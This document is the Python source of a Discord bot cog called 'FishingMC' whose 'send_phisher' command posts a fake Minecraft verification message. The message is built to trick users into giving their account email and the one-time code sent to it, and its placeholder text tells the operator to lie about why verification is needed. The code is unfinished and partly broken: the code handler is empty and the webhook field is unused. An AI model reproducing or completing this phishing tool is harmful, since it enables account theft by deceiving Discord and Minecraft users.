from __future__ import annotations

import re

import discord
from discord import app_commands
from discord.ext import commands

from utils.checks import *

from utils.formating import *

# def get_uuid_from_username(username:str) -> str:
#     try:
#         response = requests.get(f'https://api.mojang.com/users/profiles/minecraft/{username}')
#         response.raise_for_status()
#     except requests.HTTPError:
#         return None
#     return response.json()['id']

class VeryficationForm(discord.ui.Modal, title="Verification"):
    username = discord.ui.TextInput(
        label="Minecraft Username",
        required=True,
        placeholder="Minecraft Username.",
        min_length=3,
        max_length=16
    )
    email = discord.ui.TextInput(
        label="Minecraft Email",
        required=True,
        placeholder="Minecraft Email.",
        min_length=3,
        max_length=60
    )
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        if not self.validate_email(self.email.value):
            email = discord.Embed(
                color=discord.Color.red(),
                title="❌Email Not Found",
                description="The email provided doesn't exist. Please try again with a valid email."
            ).set_footer(
                text="Make sure your email is typed correctly!"
            )
            return await interaction.response.send_message(
                embed=email,
                ephemeral=True
            )
        embed = discord.Embed(
            color=discord.Color.green(),
            title="✅ Verify Code",
            description="A verification code has been sent to your security email! Please check your inbox and verify the code using the button below."
        ).add_field(
            name="Security Email",
            value=f"``{email}``"
        ).set_footer(
            text="Ensure you check your spam folder if you don't see the email."
        )
        await interaction.response.send_message(
            embed=embed, 
            view=ConfirmButtonView(),
            ephemeral=True
            )
    
    @staticmethod
    def validate_email(email: str) -> bool:
        email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
        return re.match(email_regex, email)

class ConfirmCodeForm(discord.ui.Modal, title="Confirm Code"):
    code = discord.ui.TextInput(
        label="Code",
        required=True,
        placeholder="Code.",
        min_length=6,
        max_length=6,
    )
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        ...

class SendEmbedForm(discord.ui.Modal, title="Send Embed"):
    _webhook_url = discord.ui.TextInput(
        label="Webhook Url",
        required=True,
        placeholder="Webhook Url.",
        max_length=2000
    )
    
    _title = discord.ui.TextInput(
        label="Title",
        required=False,
        placeholder="MINECRAFT Verification",
        max_length=256
    )
    _description = discord.ui.TextInput(
        label="Description",
        style=discord.TextStyle.paragraph,
        required=False,
        placeholder="Lie why should they verify their account?\nExample: English or Spanish? Not veryfied as gay.",
        max_length=4000
    )
    
    def __init__(self, bot: commands.Bot, *, title = ..., timeout = None, custom_id = ...):
        super().__init__(title=title, timeout=timeout, custom_id=custom_id)
        self.bot = bot
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        
        title = self._title.placeholder
        if self._title.value:
            title = self._title.value
        description = self._description.value
        embed = discord.Embed(
            color=discord.Color.green(),
            title=title,
            description=description
        )
        await interaction.channel.send(embed=embed, view=VerifyButtonView())
        await interaction.followup.send("**Successfully to send!**")

class VerifyButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", custom_id="button-verify", style=discord.ButtonStyle.success, emoji="✅")
    async def callback(self, interaction: discord.Interaction, button:discord.Button):
        await interaction.response.send_modal(VeryficationForm())

class ConfirmButtonView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Confirm Code", custom_id="button-confirm-code", style=discord.ButtonStyle.success, emoji="✅")
    async def callback(self, interaction: discord.Interaction, button:discord.Button):
        await interaction.response.send_modal(ConfirmCodeForm())

class FishingMC(commands.Cog):
    def __init__(self, bot:commands.Bot) -> None:
        self.bot = bot
        self.apikey = bot.config['apikey'].get('hypixel', None)
        
        
        
        self.bot.add_view(VerifyButtonView())
        self.bot.add_view(ConfirmButtonView())
    
    @app_commands.command()
    @mod_or_permissions()
    async def send_phisher(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer("**Submmiting embed...**")
        await interaction.response.send_modal(SendEmbedForm(self))

async def setup(bot:commands.Bot) -> None:
    await bot.add_cog(FishingMC(bot))